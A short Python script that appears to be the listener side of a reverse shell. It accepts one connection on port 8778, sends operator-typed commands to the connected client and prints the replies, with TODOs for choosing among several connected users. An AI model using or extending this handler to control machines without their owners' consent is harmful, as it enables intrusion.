import socket

# constants
LISTENING_PORT = 8778


def main():
    # this socket redirects clients to their 'personal' conversation socket
    listening_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # bind the socket to the computer ip \ port
    listening_socket.bind(('', LISTENING_PORT))

    listening_socket.listen(1)
    client_socket, client_address = listening_socket.accept()  # the client gets his own socket now
    try:
        while True:  # TODO: Add a menu that stops the user from entering commands until someone connected.
            # listen for incoming traffic
            # TODO: menu to select a user to interact with

            print(client_socket.recv(1024).decode(), end="")  # print current working directory
            # ask for command:
            command = input()
            client_socket.sendall(command.encode())
            command_output = client_socket.recv(1024).decode()
            if command_output != "don't_display":
                print(command_output, end="")  # print command output
    except KeyboardInterrupt:
        print("Keyboard Interrupted, exiting now.")
        client_socket.close()
        listening_socket.close()


def init():
    """
    This function prints welcome message to the screen with some instructions.
    :return:
    """


if __name__ == '__main__':
    main()
